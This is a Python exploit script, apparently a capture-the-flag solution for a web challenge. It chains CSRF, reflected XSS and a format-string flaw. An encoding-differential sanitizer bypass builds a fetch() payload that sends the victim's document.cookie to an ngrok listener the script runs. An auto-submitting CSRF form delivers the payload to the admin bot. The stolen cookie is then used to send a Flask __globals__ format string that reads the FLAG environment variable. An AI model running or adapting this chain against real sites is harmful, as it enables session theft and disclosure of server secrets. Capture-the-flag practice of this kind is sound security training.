# pip install requests flask ngrok 
# export NGROK_AUTHTOKEN=xxx
# curl http://localhost:1337/exploit

# CSRF to RXSS to Format String Vuln
# RXSS (sanitizer bypass) -> https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/

from flask import Flask, request
import ngrok
import base64
import requests
import time

listener = ngrok.forward(1337, authtoken_from_env=True)
NGROK_HOST = listener.url()
CHALLENGE_HOST = 'https://saymyname-2e9ef517e48f35f8.deploy.phreaks.fr/'

def sanitizer_bypass():
    url = NGROK_HOST + '/recv-cookie?r='
    # change redirect to /wait to trigger XSS
    payload = f"\x1b\x28\x4a\"[0]=String.fromCharCode({ord('#')});fetch(String.fromCharCode({','.join(str(ord(c)) for c in url)})+btoa(document.cookie));//"
    return payload

def html_entities(value):
    payload = "".join(f"&#{ord(c)};" if not c.isalnum() else c for c in value)
    return payload

def craft_csrf(payload):
    return f"""
    <html>
    <body>
        <form action="http://127.0.0.1:5000/your-name#behindthename-redirect" method="POST">
        <input type="hidden" name="name" value="{payload}" />
        <input type="submit" value="Submit request" />
        </form>
        <script>
        history.pushState('', '', '/');
        document.forms[0].submit();
        </script>
    </body>
    </html>
    """

payload1 = sanitizer_bypass()
payload2 = html_entities(payload1)
csrf_payload = craft_csrf(payload2)

app = Flask(__name__)

@app.route('/exploit')
def exploit():
    requests.get(f'{CHALLENGE_HOST}/report?url={NGROK_HOST}/csrf')
    return 'exploit'

@app.route('/csrf')
def csrf():
    return csrf_payload

@app.route('/recv-cookie')
def recv_cookie():
    cookie = base64.b64decode(request.args.get('r')).decode()
    print(f'[+] Cookie : {cookie}')

    format_string_payload = '{.__globals__[Flask].get.__globals__[os].environ[FLAG]}'
    r = requests.get(f'{CHALLENGE_HOST}/admin?prompt={format_string_payload}', headers={'Cookie': cookie})
    print(f'[+] Flag : {r.text}')
    return 'Thanks for the flag ;-)'

app.run(host='0.0.0.0', port=1337)
